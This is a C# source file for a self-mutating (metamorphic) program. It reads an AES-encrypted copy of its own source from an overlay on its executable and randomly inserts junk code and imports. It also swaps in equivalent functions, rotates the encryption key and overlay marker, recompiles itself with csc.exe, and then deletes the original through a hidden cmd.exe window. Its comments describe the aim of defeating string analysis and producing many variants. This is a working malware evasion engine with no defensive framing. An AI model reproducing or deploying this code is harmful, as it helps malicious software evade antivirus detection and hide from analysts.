using System;
using System.Collections;
using System.IO;
//TRASH_IMPORT1
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;
//TRASH_IMPORT2
using System.Threading;
using System.Linq;
//TRASH_IMPORT3
using System.Diagnostics;

class Program
{
    // static random to avoid random duplicates
    static Random rnd = new Random();

    static void Main(string[] args)
    {


        //TRASH_CODE1

        // label to find the encrypted sourcecode of this program 
        string overLayLabel = "firstOL16Bit....";
        byte[] overLayLabelBytes = System.Text.Encoding.UTF8.GetBytes(overLayLabel);

        // current executable path
        string ownExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;

        //TRASH_CODE2

        // read own executable bytes
        byte[] ownExeBytes = File.ReadAllBytes(ownExePath);

        // search for all those byte sequences in the array
        IEnumerable<int> indices = PatternAt(ownExeBytes, overLayLabelBytes);

        // get the last found index
        int lastIndex = indices.LastOrDefault();

        if (lastIndex == -1)
        {
            Console.WriteLine("overlay not found");
            Environment.Exit(1);
        }

        int encOverlayLength = ownExeBytes.Length - (lastIndex + overLayLabel.Length);
        if (encOverlayLength < 0)
        {
            Console.WriteLine("Error: New array length is negative.");
            Environment.Exit(1);
        }

        byte[] encOverlay = new byte[encOverlayLength];
        Array.Copy(ownExeBytes, lastIndex + overLayLabel.Length, encOverlay, 0, encOverlayLength);


        // the AES key and init vector for the encryption
        string key = "firstKey16Bit...";
        string iVector = "firstVector16Bit";
        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(key);
        byte[] iVectorBytes = System.Text.Encoding.UTF8.GetBytes(iVector);


        // decrypt the overlay to get the source code (the .NET encryption class uses CBC cipher mode and 128 bit block size by default)
        // this source code will be "strong" modified and co""mpiled later
        string decSourceCode = DecryptStringFromBytes_Aes(encOverlay, keyBytes, iVectorBytes);

        //TRASH_CODE3

        // modify the source code: replace the labels with trash codes and imports and updating the iVector, key and overlay label
        // create the code strings  (created with concatinator to avoid that our program replace it"
        // the outcommented version build the string from a byte array at runtime to enhance the security (avoid string analysis)   
        string trashCode1 = @"
            Random r = new Random();
            int n = r.Next(1, 101);
            int a = 0;
            int b = 1; 
                    for (int i = 0; i < n; i++)" + @"
            {
                int c = a + b;
                a = b;
                b = c;
            }
                ";


        string trashCode2 = @"
            int numb = 982975;
            string input = Convert.ToString(numb);" + @"
            char[] chars = input.ToCharArray();
            Array.Reverse(chars);
            string reversed = new string(chars);
                ";


        string trashCode3 = @"
            List<int> numbers = new List<int> { 1, 2, 3, 4, 5 };
            numbers.Add(6);
            numbers.AddRange(new int[] { 7, 8, 9 });" + @"
                    numbers.Remove(3);
            numbers.RemoveAt(0);
            int var = 0;
            foreach (int num in numbers)
            {
                var = num;
            }
                ";


        string trashCode4 = @"
            int numberz = 98043082;
            string sentence = Convert.ToString(numberz);" + @"
            string[] words = sentence.Split('0');
            string reversedSentence = string.Join("" "", words.Select(word => new string(word.ToCharArray().Reverse().ToArray())));
                ";


        string trashCode5 = @"
            int[,] matrix = { { 1, 2 }, { 3, 4 }, { 5, 6 } };
            int sum = 0;" + @"
            foreach (int num in matrix) 
                    {
                sum += num;
            }
                ";


        string trashImport1 = "using System" + ".Data.SqlClient;";
        string trashImport2 = "using System" + ".Xml;";
        string trashImport3 = "using System" + ".Web;";


        // our legit FindSequence function from our actual program
        // concatinate the func strings otherwise our program will also replace this strings
        string func = @"
    static int FindSequence(byte[] byteArray, byte[] searchSequence)
    {
        for (int i = 0; i <= byteArray.Length - searchSequence.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < searchSequence.Length; j++)
            {
                if (byteArray[i + j] != searchSequence[j])" + @"
                {
                    found = false;
                    break;
                }
            }
            if (found)
            {
                return i;
            }
        }
        return -1;
    }";

        string funcAlternativeOne = @"
    static int FindSequence(byte[] byteArray, byte[] searchSequence)
    {
        var indices = new int[searchSequence.Length];
        int index = 0;
        foreach (byte searchByte in searchSequence)
        {
            int currentIndex = Array.IndexOf(byteArray, searchByte, index);" + @"
            if (currentIndex < 0)
            {
                return -1;
            }
            indices[index++] = currentIndex;
        }
        if (Enumerable.SequenceEqual(byteArray.Skip(indices[0]).Take(searchSequence.Length), searchSequence))
        {
            return indices[0];
        }
        return -1;
    }";

        string funcAlternativeTwo = @"
    static int FindSequenceAlt2(byte[] byteArray, byte[] searchSequence)
    {
        HashSet<byte> searchSet = new HashSet<byte>(searchSequence);
        for (int i = 0; i <= byteArray.Length - searchSequence.Length; i++)" + @"
        {
            bool found = true;
            byte[] slice = new byte[searchSequence.Length];
            Array.Copy(byteArray, i, slice, 0, searchSequence.Length);
            HashSet<byte> sliceSet = new HashSet<byte>(slice);
            if (searchSet.SetEquals(sliceSet))
            {
                return i;
            }
        }
        return -1;
    }";

        // swap some labels to archieve a replacement on random places
        List<string> trashCodes = new List<string>();

        // collect found labels in a list
        if (decSourceCode.Contains("//TRASH" + "_CODE1"))
        {
            trashCodes.Add("//TRASH" + "_CODE1");
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE2"))
        {
            trashCodes.Add("//TRASH" + "_CODE2");
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE3"))
        {
            trashCodes.Add("//TRASH" + "_CODE3");
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE4"))
        {
            trashCodes.Add("//TRASH" + "_CODE4");
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE5"))
        {
            trashCodes.Add("//TRASH" + "_CODE5");
        }

        // replace the found label with another found label that we randomly pick (ReplaceOnce to avoid possibility of reduntant labels)
        if (decSourceCode.Contains("//TRASH" + "_CODE1"))
        {
            int choice = rnd.Next(0, trashCodes.Count);
            decSourceCode = ReplaceOnce(decSourceCode, "//TRASH" + "_CODE1", trashCodes[choice]);
            // erase choosen element to avoid redundant labels
            trashCodes.RemoveAt(choice);
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE2"))
        {
            int choice = rnd.Next(0, trashCodes.Count);
            decSourceCode = ReplaceOnce(decSourceCode, "//TRASH" + "_CODE2", trashCodes[choice]);
            trashCodes.RemoveAt(choice);
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE3"))
        {
            int choice = rnd.Next(0, trashCodes.Count);
            decSourceCode = ReplaceOnce(decSourceCode, "//TRASH" + "_CODE3", trashCodes[choice]);
            trashCodes.RemoveAt(choice);
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE4"))
        {
            int choice = rnd.Next(0, trashCodes.Count);
            decSourceCode = ReplaceOnce(decSourceCode, "//TRASH" + "_CODE4", trashCodes[choice]);
            trashCodes.RemoveAt(choice);
        }
        if (decSourceCode.Contains("//TRASH" + "_CODE5"))
        {
            int choice = rnd.Next(0, trashCodes.Count);
            decSourceCode = ReplaceOnce(decSourceCode, "//TRASH" + "_CODE5", trashCodes[choice]);
            trashCodes.RemoveAt(choice);
        }

        // replace some marks with trash codes & imports
        try
        {

            int choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche to make a change
            {
                // concatinate the label strings otherwise our program will also replace this strings
                if (decSourceCode.Contains("//TRASH" + "_CODE1"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_CODE1", trashCode1);
                }
                else if (decSourceCode.Contains(trashCode1))
                {
                    decSourceCode = decSourceCode.Replace(trashCode1, "//TRASH" + "_CODE1");
                }
            }

            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_CODE2"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_CODE2", trashCode2);
                }
                else if (decSourceCode.Contains(trashCode2))
                {
                    decSourceCode = decSourceCode.Replace(trashCode2, "//TRASH" + "_CODE2");
                }
            }

            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_CODE3"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_CODE3", trashCode3);
                }
                else if (decSourceCode.Contains(trashCode3))
                {
                    decSourceCode = decSourceCode.Replace(trashCode3, "//TRASH" + "_CODE3");
                }
            }

            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_CODE4"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_CODE4", trashCode4);
                }
                else if (decSourceCode.Contains(trashCode4))
                {
                    decSourceCode = decSourceCode.Replace(trashCode4, "//TRASH" + "_CODE4");
                }
            }
            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_CODE5"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_CODE5", trashCode5);
                }
                else if (decSourceCode.Contains(trashCode5))
                {
                    decSourceCode = decSourceCode.Replace(trashCode5, "//TRASH" + "_CODE5");
                }
            }


            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_IMPORT1"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_IMPORT1", trashImport1);
                }
                else if (decSourceCode.Contains(trashImport1))
                {
                    decSourceCode = decSourceCode.Replace(trashImport1, "//TRASH" + "_IMPORT1");
                }
            }
            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_IMPORT2"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_IMPORT2", trashImport2);
                }
                else if (decSourceCode.Contains(trashImport2))
                {
                    decSourceCode = decSourceCode.Replace(trashImport2, "//TRASH" + "_IMPORT2");
                }
            }
            choice = rnd.Next(1, 4);
            if (choice > 1)     // 66% canche
            {
                if (decSourceCode.Contains("//TRASH" + "_IMPORT3"))
                {
                    decSourceCode = decSourceCode.Replace("//TRASH" + "_IMPORT3", trashImport3);
                }
                else if (decSourceCode.Contains(trashImport3))
                {
                    decSourceCode = decSourceCode.Replace(trashImport3, "//TRASH" + "_IMPORT3");
                }
            }

            //TRASH_CODE4

            // replace a legit function with a new function that achieves the same result
            // this could be done with all functions in the code and is very effective if we create multiple alternatives for one function and pick a rnd one to replace
            // e.g.: if we choose 5 functions for which we write 3 alternatives each, our program has 4^5 (1024) possible ways to achieve the same result

            // replace the legit func with an alternative function
            choice = rnd.Next(1, 4);
            if (choice > 1)
            {
                if (decSourceCode.Contains(func))
                {
                    decSourceCode = decSourceCode.Replace(func, funcAlternativeOne);
                }
                else if (decSourceCode.Contains(funcAlternativeOne))
                {
                    decSourceCode = decSourceCode.Replace(funcAlternativeOne, funcAlternativeTwo);
                }
                else if (decSourceCode.Contains(funcAlternativeTwo))
                {
                    decSourceCode = decSourceCode.Replace(funcAlternativeTwo, func);
                }
            }

        }

        catch (Exception e)
        {
            Console.WriteLine("error: " + e.Message);
            Thread.Sleep(5000);
            System.Environment.Exit(1);
        }


        // update the iVector, key and OL label in the source code
        // create new iVector, key and OL label strings for string replacement
        string nKey = GenerateRandomString(16);
        string nIVector = GenerateRandomString(16);
        string nOverLayLabel = GenerateRandomString(16);

        // create also byte versions for the enc func and to append raw bytes to the new compiled version
        byte[] nKeyBytes = Encoding.UTF8.GetBytes(nKey);
        byte[] nIVectorBytes = Encoding.UTF8.GetBytes(nIVector);
        byte[] nOverLayLabelBytes = Encoding.UTF8.GetBytes(nOverLayLabel);

        // replace the old data wtith the new data
        decSourceCode = decSourceCode.Replace(key, nKey);
        decSourceCode = decSourceCode.Replace(iVector, nIVector);
        decSourceCode = decSourceCode.Replace(overLayLabel, nOverLayLabel);


        //TRASH_CODE5

        // compile the modified source code with csc.exe
        // prepare file name, csc.exe path, cs tmp file and arguments for compilation
        string newFileName = rnd.Next(1000, 10000).ToString() + ".exe";
        string cscPath = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe";

        string tempSourceFile = Path.GetTempFileName() + ".cs";
        File.WriteAllText(tempSourceFile, decSourceCode);

        string outputExe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, newFileName);
        string arguments = "/target:exe /out:" + outputExe + " " + tempSourceFile;

        // Starte den Kompilierungsprozess
        Process process = Process.Start(cscPath, arguments);

        // Überprüfe, ob der Prozess erfolgreich gestartet wurde
        if (process != null)
        {
            process.WaitForExit();
        }

        File.Delete(tempSourceFile);

        // encrypt the source code that will be appended with the new key and init vector
        byte[] nEncOverlay = EncryptStringToBytes_Aes(decSourceCode, nKeyBytes, nIVectorBytes);


        // append the new OL label and enc modified source code as overlay to the new compiled executable
        appendOverlay(newFileName, nOverLayLabelBytes, nEncOverlay);


        // self melt via cmd.exe
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
        {
            FileName = "cmd.exe",
            // wait 1 sec to make sure that the process is dead
            Arguments = "/C timeout 1 & Del " + AppDomain.CurrentDomain.FriendlyName,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            // hide the cmd window
            CreateNoWindow = true
        });
        System.Environment.Exit(0);

    }


    static void appendOverlay(string exeFilePath, byte[] overLayLabel, byte[] encSourceCode)
    {
        // open file in binary mode to modify it and append the overlay
        using (FileStream fs = new FileStream(exeFilePath, FileMode.Append, FileAccess.Write))
        {
            // overlay = label + source code
            byte[] wholeOverlay = overLayLabel.Concat(encSourceCode).ToArray();
            // append the byte array
            fs.Write(wholeOverlay, 0, wholeOverlay.Length);
        }
    }

    public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
    {
        for (int i = 0; i <= source.Length - pattern.Length; i++)
        {
            if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
            {
                yield return i;
            }
        }
    }


    static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
    {
        string plaintext = null;
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = Key;
            aesAlg.IV = IV;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msDecrypt = new MemoryStream(cipherText))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                    {
                        plaintext = srDecrypt.ReadToEnd();
                    }
                }
            }
        }
        return plaintext;
    }


    static byte[] EncryptStringToBytes_Aes(string plainText, byte[] Key, byte[] IV)
    {
        byte[] encrypted;
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = Key;
            aesAlg.IV = IV;

            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                    {
                        swEncrypt.Write(plainText);
                    }
                    encrypted = msEncrypt.ToArray();
                }
            }
        }
        return encrypted;
    }


    static string ReplaceOnce(string text, string search, string replace)
    {
        int index = text.IndexOf(search);
        if (index < 0)
        {
            return text;
        }
        return text.Substring(0, index) + replace + text.Substring(index + search.Length);
    }

    static string GenerateRandomString(int length)
    {
        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        string randomStr = "";

        for (int i = 0; i < length; i++)
        {
            randomStr += chars[rnd.Next(chars.Length)];
        }

        return randomStr;
    }

}
